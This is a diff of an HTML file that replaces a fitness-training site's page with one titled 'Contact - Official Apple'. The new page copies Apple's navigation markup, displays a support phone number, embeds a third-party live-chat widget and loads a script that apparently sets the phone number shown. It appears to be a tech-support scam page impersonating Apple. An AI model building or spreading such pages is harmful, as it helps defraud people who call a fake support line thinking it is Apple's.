@@ -1,1506 +1,379 @@
-
-
-
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Musclinebler | Building Effective Training Plans for Lasting Athletic Progress</title>
-    <meta property="og:title" content="Musclinebler | Building Effective Training Plans for Lasting Athletic Progress" />
-    <meta property="og:image" content="product-images/training-plan-evaluation.webp" />
-    
-    <meta property="og:description" content="Physical training often feels like shouting into an empty canyon. You lift heavy objects, log miles on the treadmill, and sweat through..." />
-    <meta name="description" content="Physical training often feels like shouting into an empty canyon. You lift heavy objects, log miles on the treadmill, and sweat through..." />
-    <meta name="twitter:title" content="Musclinebler | Building Effective Training Plans for Lasting Athletic Progress">
-    <meta name="twitter:image:src" content="product-images/training-plan-evaluation.webp"/>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link rel="stylesheet" href="main/style/bootstrap-icons.css" />
-    <link rel="stylesheet" href="main/style/bootstrap.css" />
-    <script src="main/js/jquery.min.js"></script>
-    <script src="main/js/bootstrap.js"></script>
-     
-    <link rel="shortcut icon" href="site-logo.png" type="image/x-icon" />
-    <link href="https://fonts.googleapis.com/css2?family=Albert+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet" />
-    <link href="https://fonts.googleapis.com/css2?family=Red+Rose:wght@300..700&display=swap" rel="stylesheet" />
-    
-
-    <style>
-        :root{
-          --accent-color: #257A3E;
-          --white-color: #fff;
-          --background-minor: #353636a3;
-        }
-
-          body{
-            direction: ltr;
-            font-family: 'Albert Sans', sans-serif !important;
-            font-size: 13px;
-            margin: 0;
-            padding: 0;
-            background-color:  #180707;
-            
-          }
-
-          h1, h2, h3, h4, h5{
-            margin: 0;
-            padding: 0;
-          }
-
-          button{
-            cursor: pointer;
-          }
-
-          button span{
-            font-size:  inherit;
-            line-height: 1.8;
-          }
-
-          a{
-            text-decoration: none;
-            font-size:  inherit;
-            color: inherit;
-            transition: 0.5s ease-out;
-          }
-
-          a:hover,
-          a:focus{
-            color: #180707;
-          }
-          .main {
-            color: var(--white-color);
-          }
-          img{
-            display: block;
-            max-width: 100%;
-          }
-
-          .section{
-            padding: 81px 0;
-          }
-
-          .title{
-            color: var(--accent-color);
-            font-weight: 600;
-            margin-bottom:  36px;
-          }
-
-          .btn-up {
-            position: fixed;
-            background-color: #93959a97;
-            right: 20px;
-            bottom: 20px;
-            border-radius: 50%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 50px;
-            height: 50px;
-            transition: 0.5s;
-          }
-
-          .btn-up::before {
-            content: "";
-            width: 20px;
-            height: 20px;
-            background: transparent no-repeat center center;
-            background-size: 100% 100%;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23fff' viewBox='0 0 16 16'%3E%3Cpath fill-rule='evenodd' d='M7.646 4.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1-.708.708L8 5.707l-5.646 5.647a.5.5 0 0 1-.708-.708l6-6z'/%3E%3C/svg%3E");
-          }
-
-          .btn-up_hide {
-            display: none;
-          }
-
-          .btn-up:hover {
-            transform: translateY(-5px);
-            background-color: var(--accent-color);
-          }
-
-          .bi-x-circle{
-            color: var(--white-color);
-            width: 20px;
-            height: 20px;
-          }
-          .contact-us{
-            padding: 12px;
-          }
-          .priv-us {
-            padding: 100px 0px;
-          }
-          .contact-box{
-            display: flex;
-            flex-direction:  column;
-            gap:  6px;
-            align-items: center;
-            justify-content: center;
-          }
-
-          .contact-box a{
-            color: var(--white-color);
-            transition: 0.5s ease-out;
-          }
-
-          .contact-box a:hover,
-          .contact-box a:focus{
-            color: var(--accent-color);
-          }
-
-          .bi-envelope-at,
-          .bi-phone{
-            color: var(--accent-color);
-          }
-
-          .bi-dash{
-            display: none;
-          }
-
-          .contact-item{
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-          }
-
-          .nav-section{
-            background-color: var(--background-minor);
-            padding: 10px 0;
-          }
-
-          .logo-wr{
-            color: #fff;
-            display: flex;
-            flex-direction: row;
-            gap: 8px;
-            align-items: center;
-            justify-content: center;
-          }
-
-          .logo-img-box{
-            color: var(--white-color);
-            width: 50px;
-            height: 50px;
-          }
-          .logo-img-box img {
-            max-height: 100%;
-          }
-
-          .bi-menu-button-fill{
-            color: var(--white-color);
-          }
-
-          .navbar-toggler{
-            transition: 0.5s ease-out;
-          }
-
-          .navbar-toggler:focus,
-          .navbar-toggler:hover,
-          .navbar-toggler:active{
-            box-shadow: none;
-            background-color: var(--accent-color);
-          }
-
-          .navbar-nav{
-            text-align:  center;
-          }
-
-          .nav-item a{
-            color: var(--white-color);
-            transition: 0.5s ease-out;
-          }
-
-          .nav-item a:hover,
-          .nav-item a:focus{
-            color: var(--accent-color);
-          }
-
-          .hero{
-            background-image:  linear-gradient(
-              to right,
-              rgba(46, 45, 47, 0.38), rgba(2, 2, 2, 0.38)
-            ), url(files/images/gallery.jpg);
-            position: relative;
-            z-index: 1;
-            background-position: bottom center;
-            background-size: cover;
-            background-attachment: fixed;
-            color: var(--white-color);
-            text-align: center;
-            padding:  120px 0;
-          }
-
-          .hero-title{
-            font-size: 22px;
-            margin-bottom:  22px;
-          }
-
-          .about-us-item{
-              display: flex;
-              flex-direction: column;
-              gap: 15px;
-              align-items: baseline;
-              justify-content: center;
-            }
-
-          .services{
-            background-color: var(--background-minor);
-            color: var(--white-color);
-          }
-
-          .services-item{
-            flex: 1;
-            position: relative;
-          }
-
-          .services-img{
-            width: auto;
-            height: 500px;
-            overflow: hidden;
-          }
-
-          .services-img img{
-            object-fit: cover;
-            height: 100%;
-            width: 100%;
-            filter: brightness(0.4);
-          }
-
-          .services-text{
-            position: absolute;
-            top: 0;
-            bottom: 0;
-            left: 10px;
-            right: 10px;
-            padding:  16px;
-            background: linear-gradient(to bottom,rgba(255,255,255,0) 30%,#000 100%);
-            display: flex;
-            align-items: end;
-            transition: 0.5s ease-out;
-          }
-
-          .services-text:hover,
-          .services-text:focus{
-            background: var(--accent-color);
-            opacity: 0.7;
-          }
-
-          .rootImg{
-          float: none;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          padding: 16px;
-         }
-
-         .price{
-          color: var(--accent-color);
-          font-size: 24px;
-         }
-
-         .video-section{
-            background-image:  linear-gradient(
-        to right,
-        rgba(46, 45, 47, 0.38), rgba(2, 2, 2, 0.38)
-      ), url(files/images/gallery-6.jpg);
-            background-position: top center;
-            background-size: cover;
-            background-attachment: fixed;
-            padding:  120px 0;
-         }
-
-         .modal-content{
-          background-color: #29292a;
-          border: 1px solid var(--background-minor);
-          text-align: center;
-         }
-
-         .modal-header{
-          border-bottom: 1px solid var(--background-minor);
-         }
-
-         .play-btn{
-          background-color: var(--white-color);
-          width: 50px;
-          height: 50px;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          border-radius: 50%;
-          transition: 0.5s ease-out;
-         }
-
-        .play-btn svg{
-          color: var(--accent-color);
-          width: 25px;
-          height: 25px;
-         }
-
-        .play-btn:hover,
-        .play-btn:focus{
-          opacity: 0.8;
-         }
-
-         .tarif-list{
-          display: flex;
-          flex-direction: column;
-          gap: 16px;
-         }
-
-         .tarif-item{
-          color: var(--white-color);
-          background-color: var(--background-minor);
-          flex: 1;
-          display: flex;
-          flex-direction: column;
-          padding: 16px;
-          text-align: center;
-          gap: 16px;
-          justify-content: space-between;
-         }
-
-         .tarif-name{
-          color: var(--accent-color);
-         }
-
-         .tarif-price{
-          color: var(--accent-color);
-          font-size: 24px;
-         }
-
-         .tarif-dash{
-          display: block;
-          transform: rotate(0) !important;
-         }
-
-         .modal-form{
-           width: 90%;
-         }
-
-         .modal-form-wr{
-          display: flex;
-          flex-direction: column;
-          gap:  16px;
-        }
-
-        .tarif-modal-body{
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          flex-direction: column;
-        }
-        .modal-form-item label {
-          color: #fff;
-        }
-        .modal-form-item .input-btn_box--group,
-        .modal-form-item .textarea-btn_box--group{
-          width: 100%;
-          background-color: transparent;
-          border: 1px solid var(--white-color);
-          padding: 7px  16px;;
-          border-radius: 5px;
-          color: var(--white-color);
-        }
-
-        .btn-chose-tarif:disabled{
-          background-color: var(--accent-color);
-          opacity: 0.7;
-          cursor: auto;
-        }
-
-
-         .how-work-list{
-          color: var(--white-color);
-          display: flex;
-          flex-direction: column;
-          gap:  16px;
-          justify-content: center;
-         }
-
-         .how-work-item{
-          display: flex;
-          flex-direction:  row;
-          gap: 5px;
-          flex: 1;
-          align-items: center;
-         }
-
-        .how-work-item svg{
-          color: var(--accent-color);
-          width: 30px;
-          height: 30px;
-          flex: 0.2;
-        }
-
-        .how-work-item p{
-          flex: 1;
-          margin: 0;
-        }
-
-         .statistic{
-            background-image: linear-gradient(
-        to right,
-        rgba(46, 45, 47, 0.68), rgba(2, 2, 2, 0.68)
-      ),
-      url(files/images/gallery-8.jpg);
-            position: relative;
-            background-position: top center;
-            background-size: cover;
-            background-attachment: fixed;
-         }
-
-
-         .statistic-box{
-          color: var(--white-color);
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          text-align: center;
-          flex-direction: column;
-          background-color: #0000006e;
-          padding: 16px;
-          height: 100%;
-         }
-
-         .statistic-num{
-          font-size: 39px;
-          font-weight: 500;
-          color: var(--accent-color);
-         }
-
-         .form{
-          display: flex;
-          flex-direction: column;
-          gap: 16px;
-          align-items: center;
-          justify-content: center;
-         }
-
-         .form-box{
-          width: 270px;
-         }
-
-         .form-input{
-          width: 100%;
-          background-color: transparent;
-          border: 1px solid var(--accent-color);
-          padding: 7px  16px;
-          color: var(--white-color);
-         }
-
-         .workers-box{
-          position: relative;
-         }
-
-         .workers-img{
-            height: 350px;
-            overflow: hidden;
-         }
-
-
-         .workers-img img{
-          object-fit: cover;
-          height: 100%;
-          width: 100%;
-         }
-
-         .workers-name-box{
-          position: absolute;
-          top: 0;
-          bottom: 0;
-          left: calc(var(--bs-gutter-x)/ 2);
-          right: calc(var(--bs-gutter-x)/ 2);
-          background-color: var(--accent-color);
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          flex-direction: column;
-          opacity: 0;
-          transition: 0.5s ease-out;
-          text-align: center;
-          padding:  6px;
-         }
-
-        .workers-name-box:hover,
-        .workers-name-box:focus{
-          opacity: 0.7;
-        }
-
-         .workers-name{
-          font-weight: 600;
-          font-size: 18px;
-         }
-
-         .contacts{
-          background-image: linear-gradient(
-          to right,
-          rgba(46, 45, 47, 0.68), rgba(2, 2, 2, 0.68)
-          ),
-            url(files/images/gallery-9.jpg);
-            position: relative;
-            background-position: top center;
-            background-size: cover;
-            background-attachment: fixed;
-         }
-
-         .contact-us-wrapper{
-          gap: 16px;
-          text-align: center;
-          flex-direction: column;
-         }
-
-         .contact-us-list{
-          color: var(--white-color);
-          display: flex;
-          flex-direction: column;
-          gap: 16px;
-         }
-
-         .contact-us-item{
-          flex: 1;
-          display: flex;
-          flex-direction: column;
-          background-color: #0000006e;
-          padding:  16px;
-         }
-
-         .contact-us-item a{
-           text-decoration: none;
-           color: var(--accent-color);
-         } 0 0 0;
-          color: var(--white-color);
-          line-height: 1.5;
-          word-break: break-word;
-          opacity: 0.85;
-         }
-
-         .contact-us-item p:nth-child(even){
-          color: var(--accent-color);
-         }
-
-         .footer{
-          padding: 24px 0;
-         }
-
-         .footer-privacy-wrapper{
-          display: flex;
-          flex-direction: column;
-          gap:  16px;
-          justify-content: center;
-          align-items: center;
-       }
-
-       .footer-privacy{
-        color: var(--white-color);
-        transition: 0.5s ease-out;
-       }
-
-       .footer-privacy:hover,
-       .footer-privacy:focus{
-        color: var(--accent-color);
-       }
-
-       
-       button {
-  outline: none;
-  border: none;
-  background: inherit;
-}
-
-.button-1 {
-  align-items: center;
-  background-clip: padding-box;
-  background-color: #fa6400;
-  border: 1px solid transparent;
-  border-radius: 0.25rem;
-  box-shadow: rgba(0, 0, 0, 0.02) 0 1px 3px 0;
-  box-sizing: border-box;
-  color: #fff;
-  cursor: pointer;
-  display: inline-flex;
-  font-family: system-ui, -apple-system, system-ui, "Helvetica Neue", Helvetica,
-    Arial, sans-serif;
-  font-size: 16px;
-  font-weight: 600;
-  justify-content: center;
-  line-height: 1.25;
-  margin: 0;
-  min-height: 3rem;
-  padding: calc(0.875rem - 1px) calc(1.5rem - 1px);
-  position: relative;
-  text-decoration: none;
-  transition: all 250ms;
-  user-select: none;
-  -webkit-user-select: none;
-  touch-action: manipulation;
-  vertical-align: baseline;
-  width: auto;
-}
-
-.button-1:hover,
-.button-1:focus {
-  background-color: #fb8332;
-  box-shadow: rgba(0, 0, 0, 0.1) 0 4px 12px;
-}
-
-.button-1:hover {
-  transform: translateY(-1px);
-}
-
-.button-1:active {
-  background-color: #c85000;
-  box-shadow: rgba(0, 0, 0, 0.06) 0 2px 4px;
-  transform: translateY(0);
-}
-
-.button-2 {
-  align-items: center;
-  appearance: none;
-  background-color: #fff;
-  border-radius: 24px;
-  border-style: none;
-  box-shadow: rgba(0, 0, 0, 0.2) 0 3px 5px -1px,
-    rgba(0, 0, 0, 0.14) 0 6px 10px 0, rgba(0, 0, 0, 0.12) 0 1px 18px 0;
-  box-sizing: border-box;
-  color: #3c4043;
-  cursor: pointer;
-  display: inline-flex;
-  fill: currentcolor;
-  font-family: "Google Sans", Roboto, Arial, sans-serif;
-  font-size: 14px;
-  font-weight: 500;
-  height: 48px;
-  justify-content: center;
-  letter-spacing: 0.25px;
-  line-height: normal;
-  max-width: 100%;
-  overflow: visible;
-  padding: 2px 24px;
-  position: relative;
-  text-align: center;
-  text-transform: none;
-  transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1),
-    opacity 15ms linear 30ms, transform 270ms cubic-bezier(0, 0, 0.2, 1) 0ms;
-  user-select: none;
-  -webkit-user-select: none;
-  touch-action: manipulation;
-  width: auto;
-  will-change: transform, opacity;
-  z-index: 0;
-}
-
-.button-2:hover {
-  background: #f6f9fe;
-  color: #24ea6;
-}
-
-.button-2:active {
-  box-shadow: 0 4px 4px 0 rgb(60 64 67 / 30%),
-    0 8px 12px 6px rgb(60 64 67 / 15%);
-  outline: none;
-}
-
-.button-2:focus {
-  outline: none;
-  border: 2px solid #4285f4;
-}
-
-.button-2:not(:disabled) {
-  box-shadow: rgba(60, 64, 67, 0.3) 0 1px 3px 0,
-    rgba(60, 64, 67, 0.15) 0 4px 8px 3px;
-}
-
-.button-2:not(:disabled):hover {
-  box-shadow: rgba(60, 64, 67, 0.3) 0 2px 3px 0,
-    rgba(60, 64, 67, 0.15) 0 6px 10px 4px;
-}
-
-.button-2:not(:disabled):focus {
-  box-shadow: rgba(60, 64, 67, 0.3) 0 1px 3px 0,
-    rgba(60, 64, 67, 0.15) 0 4px 8px 3px;
-}
-
-.button-2:not(:disabled):active {
-  box-shadow: rgba(60, 64, 67, 0.3) 0 4px 4px 0,
-    rgba(60, 64, 67, 0.15) 0 8px 12px 6px;
-}
-
-.button-2:disabled {
-  box-shadow: rgba(60, 64, 67, 0.3) 0 1px 3px 0,
-    rgba(60, 64, 67, 0.15) 0 4px 8px 3px;
-}
-
-.button-3 {
-  display: inline-flex;
-  justify-content: center;
-  align-items: center;
-  background-image: linear-gradient(
-    92.88deg,
-    #455eb5 9.16%,
-    #5643cc 43.89%,
-    #673fd7 64.72%
-  );
-  border-radius: 8px;
-  border-style: none;
-  box-sizing: border-box;
-  color: #ffffff;
-  cursor: pointer;
-  flex-shrink: 0;
-  font-family: "Inter UI", "SF Pro Display", -apple-system, BlinkMacSystemFont,
-    "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue",
-    sans-serif;
-  font-size: 16px;
-  font-weight: 500;
-  height: 4rem;
-  padding: 7px 15px;
-  text-align: center;
-  text-shadow: rgba(0, 0, 0, 0.25) 0 3px 8px;
-  transition: all 0.5s;
-  user-select: none;
-  -webkit-user-select: none;
-  touch-action: manipulation;
-}
-
-.button-3:hover {
-  box-shadow: rgba(80, 63, 205, 0.5) 0 1px 30px;
-  transition-duration: 0.1s;
-}
-
-.button-4 {
-  background-color: initial;
-  background-image: linear-gradient(-180deg, #00d775, #00bd68);
-  border-radius: 5px;
-  box-shadow: rgba(0, 0, 0, 0.1) 0 2px 4px;
-  color: #ffffff;
-  cursor: pointer;
-  display: inline-block;
-  font-family: Inter, -apple-system, system-ui, Roboto, "Helvetica Neue", Arial,
-    sans-serif;
-  height: 44px;
-  line-height: 44px;
-  outline: 0;
-  overflow: hidden;
-  padding: 0 20px;
-  pointer-events: auto;
-  position: relative;
-  text-align: center;
-  touch-action: manipulation;
-  user-select: none;
-  -webkit-user-select: none;
-  vertical-align: top;
-  white-space: nowrap;
-  width: auto;
-  z-index: 9;
-  border: 0;
-}
-
-.button-4:hover {
-  background: #00bd68;
-}
-
-.button-5 {
-  background: linear-gradient(to bottom right, #f9375a, #ff785a);
-  border: 0;
-  border-radius: 12px;
-  color: #ffffff;
-  cursor: pointer;
-  display: inline-block;
-  font-family: -apple-system, system-ui, "Segoe UI", Roboto, Helvetica, Arial,
-    sans-serif;
-  font-size: 16px;
-  font-weight: 500;
-  line-height: 2.5;
-  outline: transparent;
-  padding: 0 1rem;
-  text-align: center;
-  text-decoration: none;
-  transition: box-shadow 0.2s ease-in-out;
-  user-select: none;
-  -webkit-user-select: none;
-  touch-action: manipulation;
-  white-space: nowrap;
-}
-
-.button-5:not([disabled]):focus,
-.button-5:not([disabled]):hover {
-  box-shadow: 0 0 0.25rem rgba(0, 0, 0, 0.5),
-    -0.125rem -0.125rem 1rem rgba(255, 60, 96, 0.5),
-    0.125rem 0.125rem 1rem rgba(247, 129, 55, 0.5);
-}
-
-
-          @media (max-width: 767px){
-            .how-work-wr{
-              flex-direction: column;
-              gap: 15px;
-            }
-
-        .workers-item{
-          gap: 16px;
-        }
-
-        .tarif-list{
-          flex-direction: column;
-        }
-
-        .statistic-list{
-          gap: 16px;
-          flex-direction: column;
-         }
-
-        .services-list{
-          flex-direction: column;
-          gap: 16px;
-          }
-
-          .how-work-wr{
-            flex-direction: column-reverse;
-            gap: 15px;
-          }
-        }
-
-          @media (min-width: 768px){
-            .contact-box{
-              flex-direction: row;
-              justify-content: center;
-            }
-
-            .bi-dash{
-              display: block;
-              transform: rotate(90deg);
-              color: #fff;
-            }
-
-            .rootImg{
-              float: none;
-            }
-
-            .tarif-list{
-              flex-direction: row;
-            }
-
-            .statistic-list{
-               flex-direction: row;
-            }
-
-            .statistic-item{
-              padding-top: calc(var(--bs-gutter-x)/ 2);
-              padding-bottom: calc(var(--bs-gutter-x)/ 2);
-            }
-
-            .contact-us-wrapper{
-              display: flex;
-              flex-direction: row;
-              gap: 0;
-            }
-
-          .contact-us-list{
-            flex: 1;
-          }
-
-          .contact-us-map{
-            flex: 1;
-          }
-
-          .contact-us-map iframe{
-            height: 100%;
-          }
-
-          .footer-privacy-wrapper{
-          flex-direction: row;
-          }
-
-          .workers-item{
-            flex-direction: row;
-          }
-
-        .tarif-list{
-          flex-direction: row;
-        }
-
-          .services-list{
-          flex-direction: row;
-        }
-          }
-
-          .imagesWidth {
-            width: 100%;
-            object-fit: contain;
-            height: 261px;
-          }
-          @media (max-width: 576px){
-            .imagesWidth {
-              height: auto;
-            }
-
-          }
-
-          @media (min-width: 992px){
-            .nav-wrapper{
-              flex-direction: row;
-            }
-
-            .navbar-expand-lg .navbar-collapse {
-              justify-content: end;
-            }
-
-
-            .navbar-toggler{
-              margin: 0 auto;
-            }
-
-            .services-list{
-              flex-direction: row;
-            }
-
-            .services-img{
-              height: 350px;
-            }
-
-            .modal-content{
-              width: 800px;
-              height: auto;
-            }
-
-            .video-content{
-              height: 600px;
-            }
-
-         .play-btn{
-            width: 70px;
-            height: 70px;
-         }
-
-        .play-btn svg{
-          width: 35px;
-          height: 35px;
-         }
-        .how-work-wr{
-          flex-direction: row;
-         }
-
-        .form-box{
-          width: 500px;
-        }
-
-        .statistic-item{
-          padding-top: 0;
-          padding-bottom: 0;
-        }
-
-        .services-img{
-          height: 450px;
-        }
-      }
-
-        @media (min-width: 1200px){
-        .workers-img{
-            height: 450px;
-            overflow: hidden;
-         }
-
-        .workers-name{
-          font-size: 26px;
-         }
-        }
-        .us-us {
-          color: var(--white-color);
-        }
-        .form-check-label {
-          color: var(--white-color);
-        }
-
-        .priv-us{
-          color: var(--white-color);
-        }
-    
-.company-id{display:inline-block;margin-top:.7em;font-size:.82em;opacity:.72;letter-spacing:.04em;line-height:1.5;text-decoration:none;cursor:default;pointer-events:none;flex-shrink:0;max-width:100%;}.company-id-wrap{flex-shrink:0;max-width:100%;}
-</style>
-    
-  </head>
-  <body>
-
-    
-
-    
-    <div class="nav-section">
-      <div class="container">
-        <nav class="navbar navbar-expand-lg ">
-          <div class="container-fluid">
-            <div class="logo-wr">
-              <div class="logo-img-box">
-                <img src="site-logo.png" alt="" />
-              </div>
-              <h2>Musclinebler</h2>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-bVkCIYskB4Y-EHZYbSwOU.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-888-883-5873 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
-            <button
-              class="navbar-toggler"
-              type="button"
-              data-bs-toggle="collapse"
-              data-bs-target="#navbarNavDropdown"
-              aria-controls="navbarNavDropdown"
-              aria-expanded="false"
-              aria-label="Toggle navigation"
-            >
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-menu-button-fill"
-                viewBox="0 0 16 16"
-              >
-                <path
